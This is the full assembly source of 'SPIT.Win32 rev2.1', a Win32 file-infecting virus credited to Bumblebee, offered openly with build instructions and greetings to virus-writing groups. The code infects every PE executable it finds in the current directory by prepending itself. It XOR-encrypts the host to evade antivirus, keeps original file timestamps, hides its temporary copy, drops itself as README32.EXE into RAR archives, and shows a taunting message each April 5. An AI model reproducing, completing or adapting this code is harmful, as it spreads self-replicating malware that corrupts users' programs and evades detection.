;          
;   SPIT.Win32 rev2.1
;   a Bumblebee Win32 Virus
;
;   . Yeah! It's simple but FULL Win32 compatible -i think-. A non-resident
;   Win32 virus using ffirst 'n' fnext.
;   . Copies into host: virus+host. When host execs copies host to
;   temporary file and execs it. Then waits until exec ends to delete
;   the tmp file. It's like a spit: petty but annoying if falls over you ;)
;
;   . Is my 1st PE virus and can be improved -see icons on infected files-.
;   But SPIT uses a simple way to infect!
;
;   . Notes:
;               - Uses WinExec 'cause CreateProcess is more complex.
;               - Virus size is 8192 bytes (code+data+headers+...)
;               - Marks Dos header with 'hk' on infected files
;               - Makes a semi-random name for tmp file
;
;   . What's new on rev2?
;
;               - Only infect PE files
;               - exec host before infect
;               - Best random tmp name
;               - Hide tmp host with hidden attribute while exec
;               - Encrypts host -fuck you avers ;)-
;               - no file time change
;               - uses CD13 routines to drop over RAR file -Thanx CD13!-
;
;   . What's new on rev2.1?
;               - a stupid error fixed -WinExec 1st push must be 1 :(-
;
;
;   . ThanX to...
;
;     ... 29a for e-zines, CD13 for his cool stuff, and Lethal for
;              find a bug when i think it was finished ...
;
;
;                                               The way of the bee
;
;   . yeah Lich... win32 programming is:
;
;        push   shit
;        push   moreShit
;        push   tooMuchShit
;        call   WinGoesToHell
;
;
;       tasm /ml /m3 v32,,;
;       tlink32 -Tpe -c v32,v32,, import32.lib
;

.386
locals
jumps
.model flat,STDCALL

        ; procs to import
        extrn           ExitProcess:PROC
        extrn           CreateFileA:PROC
        extrn             WriteFile:PROC
        extrn           CloseHandle:PROC
        extrn        FindFirstFileA:PROC
        extrn         FindNextFileA:PROC
        extrn              ReadFile:PROC
        extrn       GetCommandLineA:PROC
        extrn          VirtualAlloc:PROC
        extrn           VirtualFree:PROC
        extrn           MessageBoxA:PROC
        extrn               _llseek:PROC
        extrn           GetFileSize:PROC
        extrn           DeleteFileA:PROC
        extrn               WinExec:PROC
        extrn               lstrcpy:PROC
        extrn               lstrcat:PROC
        extrn         GetSystemTime:PROC
        extrn    SetFileAttributesA:PROC
        extrn           GetFileTime:PROC
        extrn           SetFileTime:PROC


; from BC++ Win32 API on-line Reference
WIN32_FIND_DATA         struc
dwFileAttributes        dd      0
dwLowDateTime0          dd      ?       ; creation
dwHigDateTime0          dd      ?
dwLowDateTime1          dd      ?       ; last access
dwHigDateTime1          dd      ?
dwLowDateTime2          dd      ?       ; last write
dwHigDateTime2          dd      ?
nFileSizeHigh           dd      ?
nFileSizeLow            dd      ?
dwReserved              dd      0,0
cFileName               db      260 dup(0)
cAlternateFilename      db      14 dup(0)
                        db      2 dup(0)
WIN32_FIND_DATA         ends

; struc from 29A INC files... THANX you a lot!
IMAGE_DOS_HEADER  STRUC
    MZ_magic      DW    ?           ; Magic number
    MZ_cblp       DW    ?           ; Bytes on last page of file
    MZ_cp         DW    ?           ; Pages in file
    MZ_crlc       DW    ?           ; Relocations
    MZ_cparhdr    DW    ?           ; Size of header in paragraphs
    MZ_minalloc   DW    ?           ; Minimum extra paragraphs needed
    MZ_maxalloc   DW    ?           ; Maximum extra paragraphs needed
    MZ_ss         DW    ?           ; Initial (relative) SS value
    MZ_sp         DW    ?           ; Initial SP value
    MZ_csum       DW    ?           ; Checksum
    MZ_ip         DW    ?           ; Initial IP value
    MZ_cs         DW    ?           ; Initial (relative) CS value
    MZ_lfarlc     DW    ?           ; File address of relocation table
    MZ_ovno       DW    ?           ; Overlay number
    MZ_res        DW    4 DUP (?)   ; Reserved words
    MZ_oemid      DW    ?           ; OEM identifier (for e_oeminfo)
    MZ_oeminfo    DW    ?           ; OEM information; e_oemid specific
    MZ_res2       DW    10 DUP (?)  ; Reserved words
    MZ_lfanew     DD    ?           ; File address of new exe header
IMAGE_DOS_HEADER  ENDS
IMAGE_SIZEOF_DOS_HEADER EQU   SIZE  IMAGE_DOS_HEADER

; for RAR drop
HeaderSize  equ FinRARHeader-RARHeader
Size        equ 8192

.DATA

dos_header              IMAGE_DOS_HEADER <?>    ; for inf check test
find_data               WIN32_FIND_DATA <?>     ; for ffirst 'n' fnext
fMask:                  db      '*.EXE',0       ; mask for exe
ffHnd:                  dd      ?               ; ff'n'fn handle
fHnd:                   dd      ?               ; file handle
mHnd:                   dd      ?               ; memory handle
mtHnd:                  dd      ?               ; tmp memory handle
mtaHnd:                 dd      ?               ; tmp memory handle for args
commandLine:            dd      ?               ; you know...
hArgs:                  db      ?               ; flag for has args
argsPos:                dd      ?               ; pos of args in cmd line
fSize:                  dd      ?               ; tmp size of file
size2Read               dd      0               ; used for r/w ops

titleb                  db      'Virus Report rev2.1',0
vid                     db      'SPIT.Win32 is a Bumblebee Win32 Virus',0ah,0dh
mess                    db      0ah,0dh,'Feel the power of Spain and die by the SpiT!'
                        db      0ah,0dh,0
tmpHost                 db      'bbbee'
rndHost                 db      '000000.exe',0
execStatus:             db      0               ; status after exec

sysTimeStruct           db      16 dup(0)

; data for save time
stfHnd                  dd      ?
time0                   dd      0,0
time1                   dd      0,0
time2                   dd      0,0
sErr                    db      0

; data for RAR drop by CD13
dMask:          db      '*.RAR',0       ; mask for rar
Number          dd 0
RARHeader:                                      ; Header that we will add
RARHeaderCRC    dw 0                            ; We'll fill: CRC of header
RARType         db 074h                         ; File Header
RARFlags        dw 8000h
RARHeadsize     dw HeaderSize
RARCompressed   dd Size                         ; Compressed and Original
RAROriginal     dd Size                         ; size are the same, we stored
RAROs           db 0                            ; OS: ms-dos
RARCrc32        dd 0                            ; We must fill this field
RARFileTime     db 063h,078h                    ; Time of the program
RARFileDate     db 031h,024h                    ; Date of the proggy
RARNeedVer      db 014h
RARMethod       db 030h                         ; Method: storing
RARFnameSize    dw FinRARHeader-RARName
RARAttrib       dd 0
RARName         db "README32.EXE"               ; Name of file to drop

FinRARHeader label byte

.CODE

inicio:
        lea     eax,sysTimeStruct       ; check for payload
        push    eax
        call    GetSystemTime

        lea     eax,sysTimeStruct       ; april 5
        cmp     word ptr [eax+2],4
        jne     skipPay
        cmp     word ptr [eax+6],5
        jne     skipPay

        push    1000h                   ; petty payload
        lea     eax,titleb
        push    eax
        lea     eax,vid
        push    eax
        push    0
        call    MessageBoxA

skipPay:
        call    GetCommandLineA         ; get command line
        mov     dword ptr [commandLine],eax

skipArgs:                               ; skip args
        cmp     dword ptr [eax],'EXE.'
        je      argsOk
        inc     eax
        jmp     skipArgs
argsOk:
        add     eax,4
        cmp     byte ptr [eax],0
        jne     hasArgs
        mov     byte ptr hArgs,0
        jmp     sHasArgs
hasArgs:
        mov     byte ptr [eax],0
        mov     byte ptr hArgs,1
        mov     dword ptr [argsPos],eax

sHasArgs:

        call    execHoste       ; exec host

        push    00000004h       ; read/write page
        push    00001000h       ; mem commit (reserve phys mem)
        push    8192            ; size to alloc
        push    0h              ; let system decide where to alloc
        call    VirtualAlloc
        cmp     eax,0
        je      justOut         ; ops... not memory to alloc?
        mov     dword ptr [mHnd],eax

        xor     eax,eax
        push    eax
        push    00000080h
        push    3
        push    eax
        push    00000001h
        push    80000000h
        mov     eax,dword ptr [commandLine]
        push    eax
        call    CreateFileA             ; open own file for read (shared)
        cmp     eax,-1
        je      justOut                 ; error: we can't infect ..snif..

        mov     dword ptr [fHnd],eax    ; save handle

        push    0
        mov     dword ptr [size2Read],0
        lea     eax,size2Read
        push    eax
        push    8192
        push    dword ptr [mHnd]
        push    dword ptr [fHnd]
        call    ReadFile                ; read vx from hoste
        mov     eax,dword ptr size2Read
        cmp     eax,0
        je      justOut

        mov     eax,dword ptr [mHnd]
        add     eax,12h
        mov     word ptr [eax],'kh'     ; infection sign
                                        ; -only needed in 1st infection-
                                        ; but...

hOwnClose:
        mov     eax,dword ptr [fHnd]   ; close own file
        push    eax
        call    CloseHandle

        lea     eax,find_data   ; find first *.exe
        push    eax
        lea     eax,fMask
        push    eax
        call    FindFirstFileA
        cmp     eax,-1
        je      goOut
        mov     dword ptr [ffHnd],eax

fnext:
        call    checkFile       ; check file before infection process
        jc      noInfect
        call    infectFile

noInfect:
        lea     eax,find_data   ; find next *.exe
        push    eax
        mov     eax,dword ptr [ffHnd]
        push    eax
        call    FindNextFileA
        cmp     eax,0
        jne     fnext

        mov     eax,dword ptr [ffHnd]   ; close ffist/fnext handle
        push    eax
        call    CloseHandle

goOut:
        lea     eax,find_data   ; find first *.rar
        push    eax
        lea     eax,dMask
        push    eax
        call    FindFirstFileA
        cmp     eax,-1
        je      justOut  
        mov     dword ptr [ffHnd],eax

fnextRar:
        call    saveTime
        call    drop
        cmp     byte ptr [sErr],1
        je      findNextRar
        call    restoreTime

findNextRar:
        lea     eax,find_data   ; find next *.rar
        push    eax
        mov     eax,dword ptr [ffHnd]
        push    eax
        call    FindNextFileA
        cmp     eax,0
        jne     fnextRar

        mov     eax,dword ptr [ffHnd]   ; close ffist/fnext handle
        push    eax
        call    CloseHandle

justOut:
        cmp     byte ptr [execStatus],0 ; error while exec host?
        je      skipDelLoop

delLoop:
        lea     eax,tmpHost
        push    eax                     ; delete tmp hoste
        call    DeleteFileA
        cmp     eax,0
        je      delLoop                 ; wait until exec ends

skipDelLoop:
        push    0h                      ; exit
        call    ExitProcess
        jmp     skipDelLoop

checkFile:                              ; checks file
        push    edx
        lea     edx,find_data.cFileName
        call    testIfPE
        pop     edx
        jc      checkErrOut

        mov     ax,word ptr dos_header.MZ_csum
        cmp     ax,'kh'
        je      checkErrOut     ; check if it's infected yet

checkOut:
        clc
        ret

checkErrOut:
        stc
        ret

testIfPE:
        xor     eax,eax
        push    eax
        push    00000080h
        push    3
        push    eax
        push    00000001h
        push    80000000h
        push    edx
        call    CreateFileA             ; open file for read (shared)
        cmp     eax,-1
        je      loadHErrOut

        mov     dword ptr [fHnd],eax    ; save handle

        push    0
        mov     dword ptr [size2Read],0
        lea     eax,size2Read
        push    eax
        push    IMAGE_SIZEOF_DOS_HEADER
        lea     eax,dos_header
        push    eax
        push    dword ptr [fHnd]
        call    ReadFile                ; read DOS header
        mov     eax,dword ptr size2Read
        cmp     eax,0
        je      loadHErrOut

        mov     ax,word ptr [dos_header.MZ_magic]
        add     al,ah
        cmp     al,'M'+'Z'      ; check it's a EXE
        jne     loadHErrOut

        push    0
        push    dword ptr [dos_header.MZ_lfanew]
        push    dword ptr [fHnd]
        call    _llseek                 ; lseek to begin of PE header
        cmp     eax,-1
        je      loadHErrOut

        push    0
        mov     dword ptr [size2Read],0
        lea     eax,size2Read
        push    eax
        push    2
        lea     eax,dos_header
        push    eax
        push    dword ptr [fHnd]
        call    ReadFile                ; read PE sign
        mov     eax,dword ptr size2Read
        cmp     eax,0
        je      loadHErrOut

        mov     ax,word ptr [dos_header.MZ_magic]
        add     al,ah
        cmp     al,'P'+'E'      ; check it's a PE
        jne     loadHErrOut

        mov     eax,dword ptr [fHnd]   ; close file
        push    eax
        call    CloseHandle
        clc
        ret

loadHErrOut:
        mov     eax,dword ptr [fHnd]   ; close file
        push    eax
        call    CloseHandle
        stc
        ret

infectFile:

        call    saveTime                ; save time of file

        xor     eax,eax
        push    eax
        push    00000080h
        push    3
        push    eax
        push    00000001h OR 00000002h
        push    40000000h OR 80000000h
        lea     eax,find_data.cFileName
        push    eax
        call    CreateFileA             ; open file for r/w (shared)
        cmp     eax,-1
        je      infErrOutNC

        mov     dword ptr [fHnd],eax    ; save handle

        push    0
        push    eax
        call    GetFileSize
        cmp     eax,-1
        je      infErrOutC

        mov     dword ptr [fSize],eax   ; save size of file

        push    00000004h       ; read/write page
        push    00001000h       ; mem commit (reserve phys mem)
        push    eax             ; size to alloc
        push    0h              ; let system decide where to alloc
        call    VirtualAlloc    ; alloc memory for future hoste
        cmp     eax,0
        je      infErrOutC      ; ops... not memory to alloc?
        mov     dword ptr [mtHnd],eax

        push    0
        mov     dword ptr [size2Read],0
        lea     eax,size2Read
        push    eax
        push    dword ptr [fSize]
        push    dword ptr [mtHnd]
        push    dword ptr [fHnd]
        call    ReadFile                ; read future hoste
        mov     eax,dword ptr size2Read
        cmp     eax,0
        je      infErrOutC

        push    0
        push    0
        push    dword ptr [fHnd]
        call    _llseek                 ; lseek to begin of file
        cmp     eax,-1
        je      infErrOutC

        push    0
        mov     dword ptr [size2Read],0
        lea     eax,size2Read
        push    eax
        push    8192
        push    dword ptr [mHnd]
        push    dword ptr [fHnd]
        call    WriteFile               ; write virii

        call    encrypt                 ; encrypt hoste

        push    0
        mov     dword ptr [size2Read],0
        lea     eax,size2Read
        push    eax
        push    dword ptr [fSize]
        push    dword ptr [mtHnd]
        push    dword ptr [fHnd]
        call    WriteFile               ; write future hoste

        push    00004000h
        push    dword ptr [fSize]
        push    dword ptr [mtHnd]
        call    VirtualFree             ; free future host mem

infErrOutC:
        mov     eax,dword ptr [fHnd]   ; close file
        push    eax
        call    CloseHandle

infErrOutNC:
        cmp     byte ptr [sErr],0
        jne     skipRestoreTime
        call    restoreTime

skipRestoreTime:
        ret

execHoste:
        xor     eax,eax
        push    eax
        push    00000080h
        push    3
        push    eax
        push    00000001h
        push    80000000h
        mov     eax,dword ptr [commandLine]
        push    eax
        call    CreateFileA             ; open host file for read (shared)
        cmp     eax,-1
        je      exeErrOutNC

        mov     dword ptr [fHnd],eax    ; save handle

        push    0
        push    eax
        call    GetFileSize
        cmp     eax,-1
        je      exeErrOutC

        sub     eax,8192                ; sub virus size
        mov     dword ptr [fSize],eax   ; save size of file

        push    00000004h       ; read/write page
        push    00001000h       ; mem commit (reserve phys mem)
        push    eax             ; size to alloc
        push    0h              ; let system decide where to alloc
        call    VirtualAlloc    ; alloc memory for hoste
        cmp     eax,0
        je      exeErrOutC      ; ops... not memory to alloc?
        mov     dword ptr [mtHnd],eax

        push    0
        push    8192
        push    dword ptr [fHnd]
        call    _llseek                 ; lseek to hoste of file
        cmp     eax,-1
        je      exeErrOutC

        push    0
        mov     dword ptr [size2Read],0
        lea     eax,size2Read
        push    eax
        mov     eax,dword ptr [fSize]
        push    eax
        push    dword ptr [mtHnd]
        push    dword ptr [fHnd]
        call    ReadFile                ; read hoste
        mov     eax,dword ptr size2Read
        cmp     eax,0
        je      exeErrOutC

        mov     eax,dword ptr [fHnd]   ; close file
        push    eax
        call    CloseHandle

        call    encrypt                 ; dencrypt hoste

        mov     ecx,6
        mov     edx,offset rndHost
loopRnd:
        call    getRandom               ; make a random tmp name
        mov     byte ptr [edx],al
        inc     edx
        loop    loopRnd

        xor     eax,eax
        push    eax
        push    00000020h               ; archive
        push    1
        push    eax
        push    00000001h OR 00000002h
        push    40000000h
        lea     eax,tmpHost
        push    eax
        call    CreateFileA             ; open new file for write (shared)
        cmp     eax,-1
        je      exeErrOutNC

        push    0
        mov     dword ptr [size2Read],0
        lea     eax,size2Read
        push    eax
        mov     eax,dword ptr [fSize]
        push    eax
        push    dword ptr [mtHnd]
        push    dword ptr [fHnd]
        call    WriteFile               ; write hoste

        mov     eax,dword ptr [fHnd]   ; close file
        push    eax
        call    CloseHandle

        push    00004000h
        push    dword ptr [fSize]
        push    dword ptr [mtHnd]
        call    VirtualFree             ; free future host mem

        push    00000004h       ; read/write page
        push    00001000h       ; mem commit (reserve phys mem)
        push    1024            ; size to alloc
        push    0h              ; let system decide where to alloc
        call    VirtualAlloc    ; alloc memory for hoste
        cmp     eax,0
        je      exeErrOutNC     ; ops... not memory to alloc?
        mov     dword ptr [mtaHnd],eax

        lea     eax,tmpHost
        push    eax
        mov     eax,dword ptr [mtaHnd]
        push    eax
        call    lstrcpy                 ; make a command line

        cmp     byte ptr [hArgs],0      ; it has not arguments
        je      execNow

        mov     eax,dword ptr [argsPos]
        mov     byte ptr [eax],' '
        push    eax
        mov     eax,dword ptr [mtaHnd]
        push    eax
        call    lstrcat                 ; add arguments

execNow:
        push    1
        mov     eax,dword ptr [mtaHnd]
        push    eax                     ; exec tmp hoste
        call    WinExec
        mov     byte ptr [execStatus],1

        push    2
        lea     eax,tmpHost
        push    eax
        call    SetFileAttributesA      ; hide file

        ret

exeErrOutC:
        mov     eax,dword ptr [fHnd]   ; close file
        push    eax
        call    CloseHandle

exeErrOutNC:
        ret

getRandom:
        in      al,40h
        cmp     al,65
        jb      getRandom
        cmp     al,90
        ja      getRandom

        ret

encrypt:
        mov     edi,dword ptr [mtHnd]
        mov     eax,dword ptr [fSize]   ; use size low byte as ckey
        mov     ecx,dword ptr [fSize]
encryptLoop:
        xor     byte ptr [edi],al
        inc     edi
        loop    encryptLoop
        ret

saveTime:
        xor     eax,eax
        push    eax
        push    00000080h
        push    3
        push    eax
        push    00000001h
        push    80000000h
        lea     eax,find_data.cFileName
        push    eax
        call    CreateFileA             ; open own file for read (shared)
        cmp     eax,-1
        je      saveErr                 ; error: we can't save time

        mov     dword ptr [stfHnd],eax

        lea     eax,time2
        push    eax
        lea     eax,time1
        push    eax
        lea     eax,time0
        push    eax
        push    dword ptr [stfHnd]
        call    GetFileTime

        mov     eax,dword ptr [stfHnd]   ; close file
        push    eax
        call    CloseHandle
        mov     byte ptr [sErr],0
        ret

saveErr:
        mov     byte ptr [sErr],1
        ret

restoreTime:
        xor     eax,eax
        push    eax
        push    00000080h
        push    3
        push    eax
        push    00000001h
        push    40000000h
        lea     eax,find_data.cFileName
        push    eax
        call    CreateFileA             ; open own file for read (shared)
        cmp     eax,-1
        je      restoreErr              ; error: we can't restore time

        mov     dword ptr [stfHnd],eax

        lea     eax,time2
        push    eax
        lea     eax,time1
        push    eax
        lea     eax,time0
        push    eax
        push    dword ptr [stfHnd]
        call    SetFileTime

        mov     eax,dword ptr [stfHnd]   ; close file
        push    eax
        call    CloseHandle

restoreErr:
        ret

; CD13 routines modified for SPIT -cool routines!-
drop:
        xor     eax,eax         ; open rar file
        push    eax
        push    00000080h
        push    3
        push    eax
        push    eax
        push    40000000h
        lea     eax,find_data.cFileName
        push    eax
        call    CreateFileA
        cmp     eax,-1
        je      dropErr

        mov     dword ptr [fHnd],eax

        xor     eax,eax
        push    02
        push    eax                             ; Move pointer to EOF
        push    dword ptr [fHnd]
        call    _llseek

        mov     esi,dword ptr [mHnd]
        mov     edi,Size                        ; Get CRC32 of the program
        call    CRC32                           ; that we'll drop

        mov     dword ptr [RARCrc32],eax        ; Save the CRC

        mov     esi,offset RARHeader+2
        mov     edi,HeaderSize-2
        call    CRC32                           ; Get CRC32 of the header
        mov     word ptr [RARHeaderCRC],ax

        xor     eax,eax
        push    eax
        push    offset Number                   ; Number of bytes written
        push    HeaderSize
        push    offset RARHeader                ; Write the header
        push    dword ptr [fHnd]
        call    WriteFile

        mov     word ptr [RARHeaderCRC],0
        mov     word ptr [RARCrc32],0           ; Blank these fields
        mov     word ptr [RARCrc32+2],0

        push    0
        push    offset Number
        push    Size
        push    dword ptr [mHnd]                ; Drop the file
        push    dword ptr [fHnd]
        call    WriteFile

        push    dword ptr [fHnd]                ; Close it
        call    CloseHandle

dropErr:
        ret

CRC32:   cld                            ; Routine extracted from Vecna's
         push   ebx                     ; Inca virus! Muito brigado, friend!
         mov    ecx,-1                  ; Calculates CRC32 at runtime, no
         mov    edx,ecx                 ; need of big tables.
  NextByteCRC:
         xor    eax,eax
         xor    ebx,ebx
         lodsb
         xor    al,cl
         mov    cl,ch
         mov    ch,dl
         mov    dl,dh
         mov    dh,8
  NextBitCRC:
         shr    bx,1
         rcr    ax,1
         jnc    NoCRC
         xor    ax,08320h
         xor    bx,0edb8h
  NoCRC: dec    dh
         jnz    NextBitCRC
         xor    ecx,eax
         xor    edx,ebx
         dec    di
         jnz    NextByteCRC
         not    edx
         not    ecx
         pop    ebx
         mov    eax,edx
         rol    eax,16
         mov    ax,cx
         ret

Ends
End inicio
